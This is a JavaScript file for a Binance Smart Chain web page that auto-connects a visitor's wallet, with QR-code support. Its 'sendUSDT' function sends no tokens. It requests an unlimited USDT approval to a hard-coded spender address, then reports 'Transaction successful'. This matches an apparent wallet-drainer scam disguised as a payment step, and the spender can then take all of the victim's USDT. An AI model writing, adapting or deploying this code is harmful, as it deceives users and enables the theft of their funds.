let provider;
let signer;
let userAddress;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = "0x38";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
window.addEventListener("load", async () => {
  const p = new URLSearchParams(window.location.search);

  if (p.get("autoconnect") === "1") {
    try {
      await connectWallet();
    } catch (e) {
      console.log("User cancelled");
    }
  }
});

// ===== ENSURE BSC + CONNECT =====
async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  // 🔒 Ensure BSC
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }

  // 🔑 Connect wallet
  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  // 🔹 Auto fill address (if input exists)
  const addr = document.getElementById("toAddress");
  if (addr) addr.value = userAddress;
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    await connectWallet();

    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    await tx.wait();

    alert("Maya: Transaction successful ✅");

  } catch (e) {
    alert("Transaction cancelled");
  }
}

window.sendUSDT = sendUSDT;
